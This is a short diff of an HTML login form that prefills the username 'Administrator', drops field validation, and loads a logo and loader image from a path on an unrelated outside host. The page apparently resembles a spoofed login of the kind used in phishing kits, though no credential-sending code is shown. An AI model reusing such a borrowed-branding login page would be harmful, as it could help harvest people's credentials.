@@ -188,12 +188,12 @@ input[type="submit"] { cursor: pointer; }
         <h3><img src="http://henarc.com.ng/host/frsc.png">Login</h3>
 		
         <fieldset>
-			<center><div id="animation"><img src="http://henarc.com.ng/host/loaderA64.gif" /></div></center>
-            <form method="get" >
-				<div id="warnming" align="center"> </div>
-                <input type="email" id="username" required value="Email" onBlur="if(this.value=='')this.value='Email'" onFocus="if(this.value=='Email')this.value='' "> <!-- JS because of IE support; better: placeholder="Email" -->
+	<center><div id="animation"><img src="http://henarc.com.ng/host/loaderA64.gif" /></div></center>
+            <form method="" >
+		<div id="warnming" align="center"> </div>
+                <input type="text" id="username" value="Administrator"> <!-- JS because of IE support; better: placeholder="Email" -->
 
-                <input type="password" id="password" required value="Password" onBlur="if(this.value=='')this.value='Password'" onFocus="if(this.value=='Password')this.value='' "> <!-- JS because of IE support; better: placeholder="Password" -->
+                <input type="password" id="password" value="Password" > <!-- JS because of IE support; better: placeholder="Password" -->
 
                 <input type="submit" value="Login" id="submit">
 
